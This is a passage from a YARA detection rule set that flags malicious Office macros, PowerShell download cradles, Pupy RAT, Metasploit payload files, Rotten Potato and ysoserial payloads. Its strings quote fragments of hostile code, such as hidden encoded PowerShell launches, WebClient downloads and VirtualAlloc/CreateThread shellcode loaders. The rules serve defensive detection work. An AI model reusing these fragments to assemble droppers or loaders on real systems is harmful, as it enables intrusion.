\"DEMO, FILE, MAL, OFFICE, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $w1 = \"Microsoft Forms 2.0 CommandButton\" fullword ascii\n      $w2 = \"Microsoft Word 97-2003 Document\" fullword ascii\n      $p1 = \"powershell.exe\" fullword ascii\n      $p2 = \"URLDownloadToFile\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and 1 of ( $w* ) and all of ( $p* ) )\n}\n\nrule Suspicious_PowerShell_WebDownload_1_RID34F1 : DEMO FILE HIGHVOL SCRIPT T1059 T1059_001 T1105 {\n   meta:\n      description = \"Detects suspicious PowerShell code that downloads from web sites\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-22 15:52:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-04-03\"\n      tags = \"DEMO, FILE, HIGHVOL, SCRIPT, T1059, T1059_001, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"System.Net.WebClient).DownloadString(\\\"http\" ascii nocase\n      $s2 = \"System.Net.WebClient).DownloadString('http\" ascii nocase\n      $s3 = \"system.net.webclient).downloadfile('http\" ascii nocase\n      $s4 = \"system.net.webclient).downloadfile(\\\"http\" ascii nocase\n      $s5 = \"GetString([Convert]::FromBase64String(\" ascii nocase\n      $fp1 = \"NuGet.exe\" ascii fullword\n      $fp2 = \"chocolatey.org\" ascii\n      $fp3 = \" GET /\" \n      $fp4 = \" POST /\" \n      $fp5 = \".DownloadFile('https://aka.ms/installazurecliwindows', 'AzureCLI.msi')\" ascii\n      $fp6 = \" 404 \" \n      $fp7 = \"# RemoteSSHConfigurationScript\" ascii\n      $fp8 = \"<helpItems\" ascii fullword\n      $fp9 = \"DownloadFile(\\\"https://codecov.io/bash\" ascii\n      $fp10 = \"DownloadFile('https://get.golang.org/installer.exe\" ascii\n      $fpg1 = \"All Rights\" \n      $fpg2 = \"<html\" \n      $fpg3 = \"<HTML\" \n      $fpg4 = \"Copyright\" \n      $fpg5 = \"License\" \n      $fpg6 = \"<?xml\" \n      $fpg7 = \"Help\" fullword\n      $fpg8 = \"COPYRIGHT\" fullword\n   condition: \n      1 of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule APT_PupyRAT_PY_RID2BF2 : APT DEMO EXE FILE SCRIPT {\n   meta:\n      description = \"Detects Pupy RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations\"\n      date = \"2017-02-17 09:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8d89f53b0a6558d6bb9cdbc9f218ef699f3c87dd06bc03dd042290dedc18cb71\"\n      tags = \"APT, DEMO, EXE, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"reflective_inject_dll\" fullword ascii\n      $x2 = \"ImportError: pupy builtin module not found !\" fullword ascii\n      $x3 = \"please start pupy from either it's exe stub or it's reflective DLLR;\" fullword ascii\n      $x4 = \"[INJECT] inject_dll.\" fullword ascii\n      $x5 = \"import base64,zlib;exec zlib.decompress(base64.b64decode('eJzzcQz1c/ZwDbJVT87Py0tNLlHnAgA56wXS'))\" fullword ascii\n      $op1 = { 8b 42 0c 8b 78 14 89 5c 24 18 89 7c 24 14 3b fd } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20000KB and 1 of them ) or ( 2 of them )\n}\n\nrule APT_MagicHound_MalMacro_RID2F9F : APT DEMO FILE G0059 OFFICE SCRIPT T1059_001 T1203 T1566_001 {\n   meta:\n      description = \"Detects malicious macro / powershell in Office document\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations\"\n      date = \"2017-02-17 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b\"\n      hash2 = \"e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6\"\n      tags = \"APT, DEMO, FILE, G0059, OFFICE, SCRIPT, T1059_001, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell.exe \" fullword ascii\n      $s2 = \"CommandButton1_Click\" fullword ascii\n      $s3 = \"URLDownloadToFile\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 8000KB and all of them )\n}\n\nrule ShellCrew_StreamEx_1_RID2EB2 : APT DEMO EXE FILE G0009 {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar\"\n      date = \"2017-02-10 11:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"81f411415aefa5ad7f7ed2365d9a18d0faf33738617afc19215b69c23f212c07\"\n      tags = \"APT, DEMO, EXE, FILE, G0009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c  \\\"%s\\\"\" fullword wide\n      $s3 = \"uac\\\\bin\\\\install_test.pdb\" ascii\n      $s5 = \"uncompress error:%d %s\" fullword ascii\n      $s7 = \"%s\\\\AdobeBak\\\\Proc.dat\" fullword wide\n      $s8 = \"e:\\\\workspace\\\\boar\" fullword ascii\n      $s12 = \"$\\\\data.ini\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 4 of them )\n}\n\nrule ShellCrew_StreamEx_1_msi_RID305A : APT DEMO EXE FILE G0009 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file msi.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar\"\n      date = \"2017-02-10 12:36:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8c9048e2f5ea2ef9516cac06dc0fba8a7e97754468c0d9dc1e5f7bce6dbda2cc\"\n      tags = \"APT, DEMO, EXE, FILE, G0009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"msi.dll.eng\" fullword wide\n      $s2 = \"ahinovx\" fullword ascii\n      $s3 = \"jkpsxy47CDEMNSTYbhinqrwx56\" fullword ascii\n      $s4 = \"PVYdejmrsy12\" fullword ascii\n      $s6 = \"FLMTUZaijkpsxy45CD\" fullword ascii\n      $s7 = \"afhopqvw34ABIJOPTYZehmo\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 3 of them )\n}\n\nrule ShellCrew_StreamEx_1_msi_dll_RID31F5 : APT DEMO FILE G0009 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file msi.dll.eng\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar\"\n      date = \"2017-02-10 13:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"883108119d2f4db066fa82e37aa49ecd2dbdacda67eb936b96720663ed6565ce\"\n      hash2 = \"5311f862d7c824d13eea8293422211e94fb406d95af0ae51358accd4835aaef8\"\n      hash3 = \"191cbeffa36657ab1ef3939da023cacbc9de0285bbe7775069c3d6e18b372c3f\"\n      tags = \"APT, DEMO, FILE, G0009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NDOGDUA\" fullword ascii\n      $s2 = \"NsrdsrN\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4d9d and filesize < 300KB and all of them )\n}\n\nrule Msfpayloads_msf_RID2D39 : APT DEMO METASPLOIT SCRIPT {\n   meta:\n      description = \"Metasploit Payloads - file msf.sh\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-08-18\"\n      hash1 = \"320a01ec4e023fb5fbbaef963a2b57229e4f918847e5a49c7a3f631cb556e96c\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"export buf=\\\\\" ascii\n   condition: \n      filesize < 5MB and $s1\n}\n\nrule Msfpayloads_msf_2_RID2DCA : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.asp\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e52f98466b92ee9629d564453af6f27bd3645e00a9e2da518f5a64a33ccf8eb5\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"& \\\"\\\\\\\" & \\\"svchost.exe\\\"\" fullword ascii\n      $s2 = \"CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n      $s3 = \"<% @language=\\\"VBScript\\\" %>\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Msfpayloads_msf_psh_RID2EE3 : APT DEMO METASPLOIT SCRIPT {\n   meta:\n      description = \"Metasploit Payloads - file msf-psh.vba\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:33:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5cc6c7f1aa75df8979be4a16e36cece40340c6e192ce527771bdd6463253e46f\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell.exe -nop -w hidden -e\" ascii\n      $s2 = \"Call Shell(\" ascii\n      $s3 = \"Sub Workbook_Open()\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Msfpayloads_msf_exe_RID2EDA : APT DEMO METASPLOIT SCRIPT {\n   meta:\n      description = \"Metasploit Payloads - file msf-exe.vba\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"321537007ea5052a43ffa46a6976075cee6a4902af0c98b9fd711b9f572c20fd\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"'* PAYLOAD DATA\" fullword ascii\n      $s2 = \" = Shell(\" ascii\n      $s3 = \"= Environ(\\\"USERPROFILE\\\")\" fullword ascii\n      $s4 = \"'**************************************************************\" fullword ascii\n      $s5 = \"ChDir (\" ascii\n      $s6 = \"'* MACRO CODE\" fullword ascii\n   condition: \n      4 of them\n}\n\nrule Msfpayloads_msf_3_RID2DCB : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.psh\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"335cfb85e11e7fb20cddc87e743b9e777dc4ab4e18a39c2a2da1aa61efdbd054\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[DllImport(\\\"kernel32.dll\\\")] public static extern int WaitForSingleObject(\" ascii\n      $s2 = \"public enum MemoryProtection { ExecuteReadWrite = 0x40 }\" fullword ascii\n      $s3 = \".func]::VirtualAlloc(0,\" \n      $s4 = \".func+AllocationType]::Reserve -bOr [\" ascii\n      $s5 = \"New-Object System.CodeDom.Compiler.CompilerParameters\" fullword ascii\n      $s6 = \"ReferencedAssemblies.AddRange(@(\\\"System.dll\\\", [PsObject].Assembly.Location))\" fullword ascii\n      $s7 = \"public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\" fullword ascii\n      $s8 = \".func]::CreateThread(0,0,$\" fullword ascii\n      $s9 = \"public enum Time : uint { Infinite = 0xFFFFFFFF }\" fullword ascii\n      $s10 = \"= [System.Convert]::FromBase64String(\\\"/\" ascii\n      $s11 = \"{ $global:result = 3; return }\" fullword ascii\n   condition: \n      4 of them\n}\n\nrule Msfpayloads_msf_4_RID2DCC : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"26b3e572ba1574164b76c6d5213ab02e4170168ae2bcd2f477f246d37dbe84ef\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"= VirtualAlloc(IntPtr.Zero,(UIntPtr)\" ascii\n      $s2 = \".Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);\" ascii\n      $s3 = \"[System.Runtime.InteropServices.DllImport(\\\"kernel32\\\")]\" fullword ascii\n      $s4 = \"private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;\" fullword ascii\n      $s5 = \"private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);\" fullword ascii\n   condition: \n      4 of them\n}\n\nrule Msfpayloads_msf_exe_2_RID2F6B : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-exe.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3a2f7a654c1100e64d8d3b4cd39165fba3b101bbcce6dd0f70dae863da338401\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"= new System.Diagnostics.Process();\" fullword ascii\n      $x2 = \".StartInfo.UseShellExecute = true;\" fullword ascii\n      $x3 = \", \\\"svchost.exe\\\");\" ascii\n      $s4 = \" = Path.GetTempPath();\" ascii\n   condition: \n      all of them\n}\n\nrule Msfpayloads_msf_5_RID2DCD : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.msi\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a6c66dfc998bf5838993e40026e1f400acd018bde8d4c01ef2e2e8fba507065\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"required to install Foobar 1.0.\" fullword ascii\n      $s2 = \"Copyright 2009 The Apache Software Foundation.\" fullword wide\n      $s3 = \"{50F36D89-59A8-4A40-9689-8792029113AC}\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Msfpayloads_msf_6_RID2DCE : APT DEMO METASPLOIT SCRIPT {\n   meta:\n      description = \"Metasploit Payloads - file msf.vbs\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8d6f55c6715c4a2023087c3d0d7abfa21e31a629393e4dc179d31bb25b166b3f\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"= CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n      $s2 = \"= CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n      $s3 = \".GetSpecialFolder(2)\" ascii\n      $s4 = \".Write Chr(CLng(\\\"\" ascii\n      $s5 = \"= \\\"4d5a90000300000004000000ffff00\" ascii\n      $s6 = \"For i = 1 to Len(\" ascii\n      $s7 = \") Step 2\" ascii\n   condition: \n      5 of them\n}\n\nrule Msfpayloads_msf_7_RID2DCF : APT DEMO METASPLOIT SCRIPT {\n   meta:\n      description = \"Metasploit Payloads - file msf.vba\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"425beff61a01e2f60773be3fcb74bdfc7c66099fe40b9209745029b3c19b5f2f\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Private Declare PtrSafe Function CreateThread Lib \\\"kernel32\\\" (ByVal\" ascii\n      $s2 = \"= VirtualAlloc(0, UBound(Tsw), &H1000, &H40)\" fullword ascii\n      $s3 = \"= RtlMoveMemory(\" ascii\n   condition: \n      all of them\n}\n\nrule Msfpayloads_msf_8_RID2DD0 : APT DEMO METASPLOIT SCRIPT T1059_001 {\n   meta:\n      description = \"Metasploit Payloads - file msf.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"519717e01f0cb3f460ef88cd70c3de8c7f00fb7c564260bd2908e97d11fde87f\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[DllImport(\\\"kernel32.dll\\\")]\" fullword ascii\n      $s2 = \"[DllImport(\\\"msvcrt.dll\\\")]\" fullword ascii\n      $s3 = \"-Name \\\"Win32\\\" -namespace Win32Functions -passthru\" fullword ascii\n      $s4 = \"::VirtualAlloc(0,[Math]::Max($\" ascii\n      $s5 = \".Length,0x1000),0x3000,0x40)\" ascii\n      $s6 = \"public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\" fullword ascii\n      $s7 = \"::memset([IntPtr]($\" ascii\n   condition: \n      6 of them\n}\n\nrule Msfpayloads_msf_cmd_RID2ECC : APT DEMO METASPLOIT SCRIPT T1059_001 {\n   meta:\n      description = \"Metasploit Payloads - file msf-cmd.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f41932afc9b6b4938ee7a2559067f4df34a5c8eae73558a3959dd677cb5867f\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e\" ascii\n   condition: \n      all of them\n}\n\nrule Msfpayloads_msf_9_RID2DD1 : APT DEMO FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.war - contents\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e408678042642a5d341e8042f476ee7cef253871ef1c9e289acf0ee9591d1e81\"\n      tags = \"APT, DEMO, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (System.getProperty(\\\"os.name\\\").toLowerCase().indexOf(\\\"windows\\\") != -1)\" fullword ascii\n      $s2 = \".concat(\\\".exe\\\");\" fullword ascii\n      $s3 = \"[0] = \\\"chmod\\\";\" ascii\n      $s4 = \"= Runtime.getRuntime().exec(\" ascii\n      $s5 = \", 16) & 0xff;\" ascii\n      $x1 = \"4d5a9000030000000\" ascii\n   condition: \n      4 of ( $s* ) or ( uint32 ( 0 ) == 0x61356434 and $x1 at 0 )\n}\n\nrule Msfpayloads_msf_10_RID2DF9 : APT DEMO EXE FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3cd74fa28323c0d64f45507675ac08fb09bae4dd6b7e11f2832a4fbc70bb7082\"\n      tags = \"APT, DEMO, EXE, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 } \n      $s2 = { 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b } \n      $s3 = { 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule Msfpayloads_msf_svc_RID2EE4 : APT DEMO EXE FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-svc.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:33:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b02c9c10577ee0c7590d3dadc525c494122747a628a7bf714879b8e94ae5ea1\"\n      tags = \"APT, DEMO, EXE, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PAYLOAD:\" fullword ascii\n      $s2 = \".exehll\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}\n\nrule Msfpayloads_msf_ref_RID2ED5 : APT DEMO METASPLOIT SCRIPT T1059_001 {\n   meta:\n      description = \"Metasploit Payloads - file msf-ref.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4ec95724b4c2b6cb57d2c63332a1dd6d4a0101707f42e3d693c9aab19f6c9f87\"\n      tags = \"APT, DEMO, METASPLOIT, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"kernel32.dll WaitForSingleObject),\" ascii\n      $s2 = \"= ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')\" ascii\n      $s3 = \"GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object\" ascii\n      $s4 = \".DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\" ascii\n      $s5 = \"= [System.Convert]::FromBase64String(\" ascii\n      $s6 = \"[Parameter(Position = 0, Mandatory = $True)] [Type[]]\" fullword ascii\n      $s7 = \"DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,\" ascii\n   condition: \n      5 of them\n}\n\nrule RottenPotato_Potato_RID2EDA : DEMO EXE FILE HKTL T1053_005 T1068 T1134 {\n   meta:\n      description = \"Detects a component of privilege escalation tool Rotten Potato - file Potato.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/foxglovesec/RottenPotato\"\n      date = \"2017-02-07 11:32:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"59cdbb21d9e487ca82748168682f1f7af3c5f2b8daee3a09544dd58cbf51b0d5\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1053_005, T1068, T1134\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Potato.exe -ip <ip>\" fullword wide\n      $x2 = \"-enable_httpserver true -enable_spoof true\" fullword wide\n      $x3 = \"/C schtasks.exe /Create /TN omg /TR\" fullword wide\n      $x4 = \"-enable_token true -enable_dce true\" fullword wide\n      $x5 = \"DNS lookup succeeds - UDP Exhaustion failed!\" fullword wide\n      $x6 = \"DNS lookup fails - UDP Exhaustion worked!\" fullword wide\n      $x7 = \"\\\\obj\\\\Release\\\\Potato.pdb\" ascii\n      $x8 = \"function FindProxyForURL(url,host){if (dnsDomainIs(host, \\\"localhost\\\")) return \\\"DIRECT\\\";\" fullword wide\n      $s1 = \"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /K start\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 2 of them )\n}\n\nrule Ysoserial_Payload_MozillaRhino1_RID335D : DEMO EXPLOIT FILE T1203 T1566_001 {\n   meta:\n      description = \"Ysoserial Payloads - file MozillaRhino1.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 14:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0143fee12fea5118be6dcbb862d8ba639790b7505eac00a9f1028481f874baa8\"\n      tags = \"DEMO, EXPLOIT, FILE, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"ysoserial.payloads\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 40KB and all of them )\n}\n\nrule Ysoserial_Payload_C3P0_RID2F4A : DEMO EXPLOIT FILE T1203 T1566_001 {\n   meta:\n      description = \"Ysoserial Payloads - file C3P0.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 11:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9932108d65e26d309bf7d97d389bc683e52e91eb68d0b1c8adfe318a4ec6e58b\"\n      tags = \"DEMO, EXPLOIT, FILE, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"exploitppppw\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 3KB and all of them )\n}\n\nrule Ysoserial_Payload_Spring1_RID30F8 : DEMO EXPLOIT T1203 T1566_001 {\n   meta:\n      description = \"Ysoserial Payloads - file Spring1.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 13:02:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2020-11-30\"\n      hash1 = \"bf9b5f35bc1556d277853b71da24faf23cf9964d77245018a0fdf3359f3b1703\"\n      hash2 = \"9c0be107d93096066e82a5404eb6829b1daa6aaa1a7b43bcda3ddac567ce715a\"\n      hash3 = \"8cfa85c16d37fb2c38f277f39cafb6f0c0bd7ee62b14d53ad1dd9cb3f4b25dd8\"\n      tags = \"DEMO, EXPLOIT, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ysoserial/Pwner\" ascii\n   condition: \n      1 of them\n}\n\nrule Ysoserial_Payload_RID2DF5 : DEMO EXPLOIT FILE T1203 T1566_001 {\n   meta:\n      description = \"Ysoserial Payloads\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 10:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c0be107d93096066e82a5404eb6829b1daa6aaa1a7b43bcda3ddac567ce715a\"\n      hash2 = \"adf895fa95526c9ce48ec33297156dd69c3dbcdd2432000e61b2dd34ffc167c7\"\n      hash3 = \"1da04d838141c64711d87695a4cdb4eedfd4a206cc80922a41cfc82df8e24187\"\n      tags = \"DEMO, EXPLOIT, FILE, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ysoserial/payloads/\" ascii\n      $s1 = \"StubTransletPayload\" fullword ascii\n      $s2 = \"Pwnrpw\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 40KB and $x1 ) or ( all of them )\n}\n\nrule Ysoserial_Payload_3_RID2E87 : DEMO EXPLOIT FILE T1203 T1566_001 {\n   meta:\n      description = \"Ysoserial Payloads - from files JavassistWeld1.bin, JBossInterceptors.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 11:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f0d2f1095da0164c03a0e801bd50f2f06793fb77938e53b14b57fd690d036929\"\n      hash2 = 